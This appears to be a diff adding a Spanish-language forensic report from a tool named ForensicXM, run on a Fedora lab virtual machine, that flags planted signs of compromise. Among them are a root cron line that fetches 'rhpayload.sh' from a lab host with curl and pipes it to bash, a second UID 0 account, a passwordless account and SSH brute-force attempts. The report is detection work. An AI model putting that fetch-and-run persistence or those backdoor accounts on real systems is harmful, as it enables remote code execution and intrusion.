@@ -1,0 +1,190 @@
+============================================================
+        REPORTE FORENSE GENERADO POR FORENSICXM
+============================================================
+Fecha del Análisis: Tue May 19 19:20:08 2026
+
+--- [[32mIdentificación del Sistema[0m] ---
+[+] Distribución detectada: "Fedora Linux 44 (Workstation Edition)"
+[+] Información del Kernel: Linux version 6.19.10-300.fc44.x86_64 (mockbuild@4ae50e2f6b614b1a809cc64e77352d92) (gcc (GCC) 16.0.1 20260321 (Red Hat 16.0.1-0), GNU ld version 2.46-1.fc44) #1 SMP PREEMPT_DYNAMIC Wed Mar 25 18:23:49 UTC 2026
+------------------------------------------
+
+--- [[32mAnálisis Forense de Usuarios[0m] ---
+Usuario         UID   Info Seguridad      
+------------------------------------------------------------
+root            0     [Cuenta Bloqueada]
+bin             1     [Cuenta Bloqueada]
+daemon          2     [Cuenta Bloqueada]
+adm             3     [Cuenta Bloqueada]
+lp              4     [Cuenta Bloqueada]
+sync            5     [Cuenta Bloqueada]
+shutdown        6     [Cuenta Bloqueada]
+halt            7     [Cuenta Bloqueada]
+mail            8     [Cuenta Bloqueada]
+operator        11    [Cuenta Bloqueada]
+games           12    [Cuenta Bloqueada]
+ftp             14    [Cuenta Bloqueada]
+nobody          65534 [Cuenta Bloqueada]
+dbus            81    [Cuenta Bloqueada]
+tss             59    [Cuenta Bloqueada]
+systemd-oom     998   [Cuenta Bloqueada]
+polkitd         114   [Cuenta Bloqueada]
+systemd-coredump 997   [Cuenta Bloqueada]
+systemd-timesync 996   [Cuenta Bloqueada]
+chrony          995   [Cuenta Bloqueada]
+systemd-network 192   [Cuenta Bloqueada]
+systemd-resolve 193   [Cuenta Bloqueada]
+avahi           70    [Cuenta Bloqueada]
+pcscd           993   [Cuenta Bloqueada]
+malcontent-timer-ext-agent 992   [Cuenta Bloqueada]
+malcontent-timerd 991   [Cuenta Bloqueada]
+malcontent-webd 990   [Cuenta Bloqueada]
+rpc             32    [Cuenta Bloqueada]
+clevis          988   [Cuenta Bloqueada]
+usbmuxd         113   [Cuenta Bloqueada]
+gluster         987   [Cuenta Bloqueada]
+qemu            107   [Cuenta Bloqueada]
+unbound         986   [Cuenta Bloqueada]
+apache          48    [Cuenta Bloqueada]
+openvpn         984   [Cuenta Bloqueada]
+nm-openvpn      983   [Cuenta Bloqueada]
+abrt            173   [Cuenta Bloqueada]
+wsdd            982   [Cuenta Bloqueada]
+nm-openconnect  981   [Cuenta Bloqueada]
+rtkit           980   [Cuenta Bloqueada]
+pipewire        979   [Cuenta Bloqueada]
+flatpak         977   [Cuenta Bloqueada]
+geoclue         976   [Cuenta Bloqueada]
+rpcuser         29    [Cuenta Bloqueada]
+sssd            975   [Cuenta Bloqueada]
+colord          974   [Cuenta Bloqueada]
+gdm             42    [Cuenta Bloqueada]
+dnsmasq         973   [Cuenta Bloqueada]
+gnome-remote-desktop 971   [Cuenta Bloqueada]
+vboxadd         969   [Cuenta Bloqueada]
+sshd            74    [Cuenta Bloqueada]
+passim          968   [Cuenta Bloqueada]
+tcpdump         72    [Cuenta Bloqueada]
+tfg             1000  (Hash: [32mYescrypt - Alta[0m)
+rhsupport       0     [Cuenta Bloqueada]
+patchsvc        1001  [[31mSin Password (campo vacío)[0m]
+
+--- [[32mAnálisis de Persistencia y Contenido[0m] ---
+
+[+] Revisando Tareas Cron (Global) (/etc/cron.d)...
+    -> Analizando: 0hourly
+    -> Analizando: rhel-telemetry
+[31m      [!] Alerta: Comando sospechoso 'curl' encontrado en el contenido.[0m
+          Línea: * * * * * root curl -s http://192.168.56.200/rhpayload.sh | bash
+
+[+] Revisando Servicios Systemd (Global) (/etc/systemd/system)...
+    -> Analizando: ctrl-alt-del.target
+    -> Analizando: dbus-org.bluez.service
+    -> Analizando: dbus-org.fedoraproject.FirewallD1.service
+    -> Analizando: dbus-org.freedesktop.Avahi.service
+    -> Analizando: dbus-org.freedesktop.ModemManager1.service
+    -> Analizando: dbus-org.freedesktop.home1.service
+    -> Analizando: dbus-org.freedesktop.nm-dispatcher.service
+    -> Analizando: dbus-org.freedesktop.oom1.service
+    -> Analizando: dbus-org.freedesktop.resolve1.service
+    -> Analizando: dbus-org.freedesktop.thermald.service
+    -> Analizando: dbus.service
+    -> Analizando: display-manager.service
+    -> Analizando: org.freedesktop.intel_lpmd.service
+    -> Analizando: basic.target.wants
+    -> Analizando: bluetooth.target.wants
+    -> Analizando: dev-virtio\x2dports-org.qemu.guest_agent.0.device.wants
+    -> Analizando: factory-reset.target.wants
+    -> Analizando: getty.target.wants
+    -> Analizando: graphical.target.wants
+    -> Analizando: httpd.service.d
+    -> Analizando: multi-user.target.wants
+    -> Analizando: network-online.target.wants
+    -> Analizando: remote-fs.target.wants
+    -> Analizando: sockets.target.wants
+    -> Analizando: sysinit.target.wants
+    -> Analizando: systemd-homed.service.wants
+    -> Analizando: systemd-journald.service.wants
+    -> Analizando: timers.target.wants
+    -> Analizando: user@.service.wants
+    -> Analizando: vmtoolsd.service.requires
+    -> Analizando: default.target
+    -> Analizando: selinux-helper.service
+[31m      [!] Alerta: Comando sospechoso 'python' encontrado en el contenido.[0m
+          Línea: ExecStart=/usr/bin/python3 -c "import os;os._exit(0)"
+
+------------------------------------------------------------
+
+--- [[32mAnálisis de Logs de Autenticación[0m] ---
+[+] Buscando anomalías en /var/log/auth.log...
+[31m    [!] Intento fallido:[0m May 19 18:51:31 vbox sudo[4842]: pam_unix(sudo:auth): authentication failure; logname=tfg uid=1000 euid=0 tty=/dev/pts/0 ruser=tfg rhost=  user=tfg
+[32m    [*] Sesión root abierta:[0m May 19 18:51:43 vbox (systemd)[4877]: pam_unix(systemd-user:session): session opened for user root(uid=0) by root(uid=0)
+[32m    [*] Sesión root abierta:[0m May 19 18:51:43 vbox sudo[4842]: pam_unix(sudo:session): session opened for user root(uid=0) by tfg(uid=1000)
+[32m    [*] Sesión root abierta:[0m May 19 19:10:52 vbox (systemd)[4252]: pam_unix(systemd-user:session): session opened for user root(uid=0) by root(uid=0)
+[32m    [*] Sesión root abierta:[0m May 19 19:10:52 vbox sudo[4227]: pam_unix(sudo:session): session opened for user root(uid=0) by tfg(uid=1000)
+[32m    [*] Sesión root abierta:[0m May 19 19:15:21 vbox (systemd)[4349]: pam_unix(systemd-user:session): session opened for user root(uid=0) by root(uid=0)
+[32m    [*] Sesión root abierta:[0m May 19 19:15:22 vbox sudo[4336]: pam_unix(sudo:session): session opened for user root(uid=0) by tfg(uid=1000)
+[32m    [*] Sesión root abierta:[0m May 19 19:18:24 vbox (systemd)[4790]: pam_unix(systemd-user:session): session opened for user root(uid=0) by root(uid=0)
+[31m    [!] Intento fallido:[0m may 19 19:18:24 vbox sshd[3001]: Failed password for invalid user oracle from 192.168.56.77 port 45001 ssh2
+[31m    [!] Intento fallido:[0m may 19 19:18:24 vbox sshd[3002]: Failed password for invalid user oracle from 192.168.56.77 port 45002 ssh2
+[31m    [!] Intento fallido:[0m may 19 19:18:24 vbox sshd[3003]: Failed password for invalid user oracle from 192.168.56.77 port 45003 ssh2
+[31m    [!] Intento fallido:[0m may 19 19:18:24 vbox sshd[3004]: Failed password for invalid user oracle from 192.168.56.77 port 45004 ssh2
+[31m    [!] Intento fallido:[0m may 19 19:18:24 vbox sshd[3005]: Failed password for invalid user oracle from 192.168.56.77 port 45005 ssh2
+[31m    [!] Intento fallido:[0m may 19 19:18:24 vbox sshd[3006]: Failed password for invalid user oracle from 192.168.56.77 port 45006 ssh2
+[31m    [!] Intento fallido:[0m may 19 19:18:24 vbox sshd[3007]: Failed password for invalid user oracle from 192.168.56.77 port 45007 ssh2
+[31m    [!] Intento fallido:[0m may 19 19:18:24 vbox sshd[3008]: Failed password for invalid user oracle from 192.168.56.77 port 45008 ssh2
+[31m    [!] Intento fallido:[0m may 19 19:18:24 vbox sshd[3009]: Failed password for invalid user oracle from 192.168.56.77 port 45009 ssh2
+[32m    [*] Sesión root abierta:[0m May 19 19:18:24 vbox sudo[4778]: pam_unix(sudo:session): session opened for user root(uid=0) by tfg(uid=1000)
+[32m    [*] Sesión root abierta:[0m May 19 19:20:08 vbox (systemd)[4892]: pam_unix(systemd-user:session): session opened for user root(uid=0) by root(uid=0)
+
+[31m[!] Alerta:[0m Se detectaron 29 intentos de autenticación fallidos.
+------------------------------------------------------------
+
+--- [[32mHistorial de Logins Binarios (/var/log/wtmp)[0m] ---
+Usuario         Terminal        Host                 Fecha/Hora          
+--------------------------------------------------------------------------------
+tfg             tty2            local                Tue May 19 18:49:44 2026
+tfg             tty2            local                Tue May 19 18:53:29 2026
+--------------------------------------------------------------------------------
+
+--- [[32mAnálisis de Conexiones de Red (Sin netstat)[0m] ---
+Local Address          Remote Address         State        Inode      PID      Program        
+--------------------------------------------------------------------------------------------------
+127.0.0.54:53          0.0.0.0:0              LISTEN       7437       775      systemd-resolve
+127.0.0.53:53          0.0.0.0:0              LISTEN       7435       775      systemd-resolve
+0.0.0.0:5355           0.0.0.0:0              LISTEN       7420       775      systemd-resolve
+127.0.0.1:631          0.0.0.0:0              LISTEN       14794      1104     cupsd          
+10.0.2.15:45262        192.168.56.200:80      SYN_SENT     42565      4865     curl           
+10.0.2.15:48272        192.168.56.200:80      SYN_SENT     43557      4839     curl           
+--------------------------------------------------------------------------------------------------
+
+--- [[32mAnálisis de Memoria RAM (Procesos)[0m] ---
+[33m    [*] Sospecha baja: Proceso 'gnome-session-i' (PID: 2253) tiene región RWX (posible JIT legítimo, revisar).[0m
+        Detalle: 7f8579827000-7f8579837000 rwxp 00000000 00:00 0 
+[33m    [*] Sospecha baja: Proceso 'gnome-shell' (PID: 2344) tiene región RWX (posible JIT legítimo, revisar).[0m
+        Detalle: 7fd8bc200000-7fd8bcc00000 rwxp 00000000 00:00 0 
+[33m    [*] Sospecha baja: Proceso 'ptyxis' (PID: 3473) tiene región RWX (posible JIT legítimo, revisar).[0m
+        Detalle: 7f4a1a000000-7f4a1aa00000 rwxp 00000000 00:00 0 
+[33m    [*] Sospecha baja: Proceso 'nautilus' (PID: 3649) tiene región RWX (posible JIT legítimo, revisar).[0m
+        Detalle: 7f7e26400000-7f7e26e00000 rwxp 00000000 00:00 0 
+[+] Se han analizado 279 procesos en busca de anomalías en memoria.
+    -> 0 con severidad CRÍTICA (RWX + binario borrado)
+    -> 4 con sospecha baja (RWX aislado, posible JIT)
+[32m    [+] No se detectaron combinaciones críticas en memoria.[0m
+------------------------------------------------------------
+
+--- [[32mAnálisis Avanzado: Detección de Rootkits LKM[0m] ---
+[+] Validando módulos cruzando /proc/modules con /sys/module/...
+[32m    [+] Análisis limpio. No se detectaron discrepancias de módulos.[0m
+------------------------------------------------------------
+
+--- [[32mAnálisis de Privilegios: Linux Capabilities[0m] ---
+PID      UID    Nombre               Peligrosidad    Capacidades Críticas Detectadas
+--------------------------------------------------------------------------------------------------
+[31m3507     1000   catatonit            ALTA            CAP_NET_RAW(sniffer) CAP_SYS_ADMIN(escape) CAP_SYS_PTRACE(inyectar) CAP_SYS_MODULE(rootkit) CAP_DAC_OVERRIDE(leer_todo) [0m
+[31m
+    [!] Advertencia: Se han detectado 1 procesos de usuario con capacidades críticas.[0m
+--------------------------------------------------------------------------------------------------
+
+============================================================
+        FIN DEL REPORTE - INTEGRIDAD DE LA PRUEBA
+============================================================
